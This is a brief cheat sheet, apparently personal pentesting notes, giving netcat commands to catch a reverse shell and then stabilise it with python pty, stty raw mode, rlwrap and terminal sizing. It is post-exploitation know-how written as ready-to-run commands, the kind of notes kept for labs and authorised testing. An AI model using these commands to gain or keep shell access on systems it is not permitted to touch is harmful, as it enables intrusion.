# nc
# Reverse shell
```
nc -lvnp <port-number>
```
```
nc <target-ip> <chosen-port>
```
# Shell stabilization
## Shell stabilization via python
```
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
^Z
stty raw -echo; fg
```
## Shell stabilization via rlwrap
```
sudo apt install rlwrap
rlwrap nc -lvnp <port>
^Z
stty raw -echo; fg
```
# Setting rows and columns
```
Information from local machine
stty -a

Set rows and columns in reverse shell
stty rows <number>
stty cols <number>
```
